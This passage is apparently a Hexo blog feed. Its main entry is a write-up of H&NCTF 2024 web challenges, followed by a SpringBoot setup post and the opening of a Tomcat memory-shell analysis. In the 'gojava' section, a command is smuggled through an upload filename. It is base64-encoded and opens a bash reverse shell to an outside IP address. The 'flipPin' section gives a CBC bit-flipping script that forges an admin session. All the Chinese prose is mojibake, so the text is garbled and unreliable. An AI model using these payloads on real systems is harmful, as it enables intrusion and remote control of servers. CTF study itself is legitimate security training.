class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;mime/multipart&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> blacklistChars = []<span class="type">rune</span>&#123;<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// è®¾ç½®è·¯ç”±</span></span><br><span class="line">http.HandleFunc(<span class="string">&quot;/gojava&quot;</span>, compileJava)</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¾ç½®é™æ€æ–‡ä»¶æœåŠ¡å™¨</span></span><br><span class="line">fs := http.FileServer(http.Dir(<span class="string">&quot;.&quot;</span>))</span><br><span class="line">http.Handle(<span class="string">&quot;/&quot;</span>, fs)</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯åŠ¨æœåŠ¡å™¨</span></span><br><span class="line">log.Println(<span class="string">&quot;Server started on :80&quot;</span>)</span><br><span class="line">log.Fatal(http.ListenAndServe(<span class="string">&quot;:80&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isFilenameBlacklisted</span><span class="params">(filename <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">for</span> _, char := <span class="keyword">range</span> filename &#123;</span><br><span class="line"><span class="keyword">for</span> _, blackChar := <span class="keyword">range</span> blacklistChars &#123;</span><br><span class="line"><span class="keyword">if</span> char == blackChar &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">compileJava</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line"><span class="comment">// æ£€æŸ¥è¯·æ±‚æ–¹æ³•æ˜¯å¦ä¸ºPOST</span></span><br><span class="line"><span class="keyword">if</span> r.Method != http.MethodPost &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Method not allowed&quot;</span>, http.StatusMethodNotAllowed)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è§£æmultipart/form-dataæ ¼å¼çš„è¡¨å•æ•°æ®</span></span><br><span class="line">err := r.ParseMultipartForm(<span class="number">10</span> &lt;&lt; <span class="number">20</span>) <span class="comment">// è®¾ç½®æœ€å¤§æ–‡ä»¶å¤§å°ä¸º10MB</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Error parsing form&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä»è¡¨å•ä¸­è·å–ä¸Šä¼ çš„æ–‡ä»¶</span></span><br><span class="line">file, handler, err := r.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Error retrieving file&quot;</span>, http.StatusBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> file.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> isFilenameBlacklisted(handler.Filename) &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Invalid filename: contains blacklisted character&quot;</span>, http.StatusBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> !strings.HasSuffix(handler.Filename, <span class="string">&quot;.java&quot;</span>) &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Invalid file format, please select a .java file&quot;</span>, http.StatusBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">err = saveFile(file, <span class="string">&quot;./upload/&quot;</span>+handler.Filename)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Error saving file&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">saveFile</span><span class="params">(file multipart.File, filePath <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="comment">// åˆ›å»ºç›®æ ‡æ–‡ä»¶</span></span><br><span class="line">f, err := os.Create(filePath)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> f.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// å°†ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹å¤åˆ¶åˆ°ç›®æ ‡æ–‡ä»¶ä¸­</span></span><br><span class="line">_, err = io.Copy(f, file)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸ç”¨ç»†çœ‹, åŸºæœ¬ä¸Šå°±èƒ½çŒœåˆ°ä½¿ç”¨ç›¸åŒå‘½ä»¤javac + æ–‡ä»¶å è¿™ç§å½¢å¼æ¥ç¼–è¯‘ä¸Šä¼ çš„æ–‡ä»¶, é‚£ä¹ˆæ—¢ç„¶æ˜¯ç³»ç»Ÿå‘½ä»¤, å°±å¯ä»¥é€šè¿‡ä¸Šä¼ çš„ æ–‡ä»¶åè¿›è¡Œå‘½ä»¤æ³¨å…¥</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240514130817384.png" alt="image-20240514130817384"></p><p>å¯ä»¥çœ‹è§ç¡®å®å¦‚æ­¤, ä½†æ˜¯è¿™é‡Œæ˜¯ä¸€ä¸ªgojavaçš„ä½æƒé™ç”¨æˆ·, æƒ³åŠæ³•å¼¹shellææƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;1;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi83Nzc3IDA+JjE=| base64 -d |bash;Main.java&quot;</span><br></pre></td></tr></table></figure><p>æ ¹ç›®å½•ä¸‹æœ‰ä¸€ä¸ªå¾ˆç‰¹æ®Šçš„æ–‡ä»¶</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240514131921586.png" alt="image-20240514131921586"></p><p>è¿™é‡Œé¢çš„å†…å®¹å°±ç®—æ˜¯rootçš„å¯†ç </p><p>ç›´æ¥su root, ç„¶åè¿è¡Œ&#x2F;start.shå³å¯, flagåœ¨rootç›®å½•ä¸‹</p><h2 id="flipPin"><a href="#flipPin" class="headerlink" title="flipPin"></a>flipPin</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, abort</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">default_session = <span class="string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span></span><br><span class="line">key = get_random_bytes(AES.block_size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">session</span>):</span><br><span class="line">    iv = get_random_bytes(AES.block_size)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> b64encode(iv + cipher.encrypt(pad(session.encode(<span class="string">&#x27;utf-8&#x27;</span>), AES.block_size)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">session</span>):</span><br><span class="line">    raw = b64decode(session)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">filename_blacklist = &#123;</span><br><span class="line">    <span class="string">&#x27;self&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cgroup&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mountinfo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;env&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(</span><br><span class="line">            <span class="string">&quot;welcome to the FlipPIN server try request /hint to get the hint&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session).decode())</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;have a fun&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/hint&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line">    res = Response(<span class="built_in">open</span>(__file__).read(), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/read&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>():</span><br><span class="line"></span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(<span class="string">&quot;you are not logged in&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session))</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        plain_session = decrypt(session)</span><br><span class="line">        <span class="keyword">if</span> plain_session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;don\&#x27;t hack me&#x27;</span></span><br><span class="line"></span><br><span class="line">        session_data = json.loads(plain_session)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> session_data[<span class="string">&#x27;admin&#x27;</span>] :</span><br><span class="line">            filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(blacklist_str <span class="keyword">in</span> filename <span class="keyword">for</span> blacklist_str <span class="keyword">in</span> filename_blacklist):</span><br><span class="line">                abort(<span class="number">403</span>, description=<span class="string">&#x27;Access to this file is forbidden.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">return</span> f.read()</span><br><span class="line">            <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">                abort(<span class="number">404</span>, description=<span class="string">&#x27;File not found.&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                abort(<span class="number">500</span>, description=<span class="string">f&#x27;An error occurred: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;You are not an administrator&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">9091</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>è€ƒå¯ŸCBCåè½¬æ”»å‡»</p><p><a href="https://goodapple.top/archives/217">https://goodapple.top/archives/217</a></p><p>è´´ä¸€ä¸ªå…¶ä»–å¸ˆå‚…çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    1. åˆ†ç»„ 16ä¸ªå­—èŠ‚ä¸€ç»„</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;&quot;admin&quot;: 0, &quot;us</span></span><br><span class="line"><span class="comment"># ername&quot;: &quot;user1&quot;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    2. è·å–åŸå§‹å¯†æ–‡</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">ciphertext = <span class="string">&#x27;wv7sRdpuU1HMAgqUWAOjoZuLsH9jUDnCaVtBxN8fQH6zyxmGqarbH7R/cuSUVx1xnKKDoUjIeo1GQwkg39DZ6Q==&#x27;</span></span><br><span class="line">cipher = base64.b64decode(urllib.parse.unquote(ciphertext))</span><br><span class="line">array_cipher = <span class="built_in">bytearray</span>(cipher)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    3ï¼Œ å­—èŠ‚ç¿»è½¬</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">offset = <span class="number">10</span></span><br><span class="line">array_cipher[offset] =  array_cipher[offset]^ <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) ^ <span class="built_in">ord</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;newCipher:&#x27;</span>,urllib.parse.quote(base64.b64encode(array_cipher)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¹‹åå°±æ˜¯æ–‡ä»¶è¯»å–+flask pinè®¡ç®—, å·ä¸ªæ‡’</p><h2 id="å¥‡æ€ªçš„ç½‘ç«™"><a href="#å¥‡æ€ªçš„ç½‘ç«™" class="headerlink" title="å¥‡æ€ªçš„ç½‘ç«™"></a>å¥‡æ€ªçš„ç½‘ç«™</h2><p>ç›®å½•æ‰«æå¯ä»¥æ‰«æå‡ºæ¥&#x2F;404.php &#x2F;flag.php</p><p>è®¿é—®ç½‘ç«™æ—¶æœ‰ä¸€ä¸ª302é‡å®šå‘, è¿™é‡Œæœ‰æç¤º</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240530001443451.png" alt="image-20240530001443451"></p><p>å¦‚æœæœ‰ä½¿ç”¨vimçš„ç»éªŒçš„åŒ–æˆ‘ä»¬çŸ¥é“vimåœ¨å¼‚å¸¸é€€å‡ºçš„æ—¶å€™ä¼šç”Ÿæˆä¸€ä¸ªéšè—çš„ç¼“å­˜æ–‡ä»¶çš„</p><blockquote><p>ç¬¬ä¸€æ¬¡äº§ç”Ÿçš„ç¼“å­˜æ–‡ä»¶åç¼€ä¸º.swpï¼Œç¬¬äºŒæ¬¡åˆ™äº§ç”Ÿçš„ç¼“å­˜æ–‡ä»¶åç¼€ä¸º.swo,ç¬¬ä¸‰æ¬¡äº§ç”Ÿçš„ç¼“å­˜æ–‡ä»¶åç¼€ä¸º.swn, ç¬¬å››æ¬¡äº§ç”Ÿçš„ç¼“å­˜æ–‡ä»¶åç¼€ä¸º.swm</p></blockquote><h2 id="GPTS"><a href="#GPTS" class="headerlink" title="GPTS"></a>GPTS</h2><p><a href="https://xz.aliyun.com/t/14283?time__1311=mqmx9QiQKDqGqx05dIDymDuDAOqf2+kdurD&alichlgref=https://www.bing.com/">https://xz.aliyun.com/t/14283?time__1311=mqmx9QiQKDqGqx05dIDymDuDAOqf2%2BkdurD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F</a></p><h2 id="ez-tp"><a href="#ez-tp" class="headerlink" title="ez_tp"></a>ez_tp</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;H-NCTF-2024-WEB-å¤ç°&quot;&gt;&lt;a href=&quot;#H-NCTF-2024-WEB-å¤ç°&quot; class=&quot;headerlink&quot; title=&quot;H&amp;amp;NCTF 2024 WEB å¤ç°&quot;&gt;&lt;/a&gt;H&amp;amp;NCTF 2024 WEB å¤ç°&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://example.com/categories/WriteUp/"/>
    
    
    <category term="pythonå†…å­˜é©¬" scheme="http://example.com/tags/python%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
    <category term="CBCç¿»è½¬æ”»å‡»" scheme="http://example.com/tags/CBC%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"/>
    
    <category term="ä¾§ä¿¡é“" scheme="http://example.com/tags/%E4%BE%A7%E4%BF%A1%E9%81%93/"/>
    
    <category term="Flask Pinç è®¡ç®—" scheme="http://example.com/tags/Flask-Pin%E7%A0%81%E8%AE%A1%E7%AE%97/"/>
    
    <category term="ThinkPHP" scheme="http://example.com/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>SpringBootå­¦ä¹ </title>
    <link href="http://example.com/2024/05/24/SpringBoot%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2024/05/24/SpringBoot%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-05-24T11:20:23.000Z</published>
    <updated>2024-05-24T16:13:09.618Z</updated>
    
    <content type="html"><![CDATA[<h2 id="IDEAåˆ›å»ºSpringBooté¡¹ç›®"><a href="#IDEAåˆ›å»ºSpringBooté¡¹ç›®" class="headerlink" title="IDEAåˆ›å»ºSpringBooté¡¹ç›®"></a>IDEAåˆ›å»ºSpringBooté¡¹ç›®</h2><p>é€‰æ‹©åˆ›å»ºSpring Initializr</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240524192417970.png" alt="image-20240524192417970"></p><p>å‹¾é€‰Spring web</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240524192559708.png" alt="image-20240524192559708"></p><p>æ­¤æ—¶ideaä¼šé»˜è®¤ä¸ºæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªSpringBooté¡¹ç›®</p><p>ç”±äºæˆ‘ä»¬ä½¿ç”¨æ˜¯jdk 1.8, è¿™é‡Œä¼šè¸©å‘</p><p>æˆ‘ä»¬éœ€è¦æ›´æ”¹SpringBootç‰ˆæœ¬ä¸º2.xå¦åˆ™ä¼šæŠ¥é”™</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240524193743796.png" alt="image-20240524193743796"></p><p>è¿™é‡Œjavaç‰ˆæœ¬ä¹Ÿæ”¹æˆjava8</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240524193758233.png" alt="image-20240524193758233"></p><p>ä¹‹åæˆåŠŸè¿è¡Œ</p><p>å¯ä»¥çœ‹è§Tomcatå·²ç»å¯åŠ¨äº†</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240524194045710.png" alt="image-20240524194045710"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;IDEAåˆ›å»ºSpringBooté¡¹ç›®&quot;&gt;&lt;a href=&quot;#IDEAåˆ›å»ºSpringBooté¡¹ç›®&quot; class=&quot;headerlink&quot; title=&quot;IDEAåˆ›å»ºSpringBooté¡¹ç›®&quot;&gt;&lt;/a&gt;IDEAåˆ›å»ºSpringBooté¡¹ç›®&lt;/h2&gt;&lt;p&gt;é€‰æ‹©åˆ›å»ºSp</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Tomcatå†…å­˜é©¬åˆ†æ</title>
    <link href="http://example.com/2024/05/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2024/05/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/</id>
    <published>2024-05-21T14:54:52.000Z</published>
    <updated>2024-05-22T14:52:15.159Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tomcatå†…å­˜é©¬åˆ†æ"><a href="#Tomcatå†…å­˜é©¬åˆ†æ" class="headerlink" title="Tomcatå†…å­˜é©¬åˆ†æ"></a>Tomcatå†…å­˜é©¬åˆ†æ</h1><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://goodapple.top/archives/1359">https://goodapple.top/archives/1359</a></p><p><a href="https://goodapple.top/archives/1355">https://goodapple.top/archives/1355</a></p><p><a href="https://boogipop.com/2023/03/02/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90">https://boogipop.com/2023/03/02/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90</a></p><h2 id="å›é¡¾"><a href="#å›é¡¾" class="headerlink" title="å›é¡¾"></a>å›é¡¾</h2><p>ç´§æ¥ç€ä¸Šä¸€ç¯‡Java WebåŸºç¡€ç¯‡, åœ¨è¿™é‡Œç»†è¯´Tomcatå†…å­˜é©¬</p><p>åœ¨ä¹‹å‰çš„å­¦ä¹ ä¸­, æˆ‘ä»¬å·²ç»æ­å»ºäº†tomcatå’Œjspçš„è°ƒè¯•ç¯å¢ƒ</p><p>å‚è€ƒ</p><p><a href="https://zhuanlan.zhihu.com/p/35454131">https://zhuanlan.zhihu.com/p/35454131</a></p><h3 id="ä¸‰å¤§ç»„ä»¶"><a href="#ä¸‰å¤§ç»„ä»¶" class="headerlink" title="ä¸‰å¤§ç»„ä»¶"></a>ä¸‰å¤§ç»„ä»¶</h3><h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4><blockquote><p>Servletæ˜¯ç”¨æ¥å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚çš„åŠ¨æ€èµ„æºï¼Œå½“Tomcatæ¥æ”¶åˆ°æ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚æ—¶ï¼Œä¼šå°†å…¶è§£ææˆ<code>RequestServlet</code>å¯¹è±¡å¹¶å‘é€åˆ°å¯¹åº”çš„Servletä¸Šè¿›è¡Œå¤„ç†ã€‚</p></blockquote><h4 id="Filter"><a href="#Filter" class="headerlink" 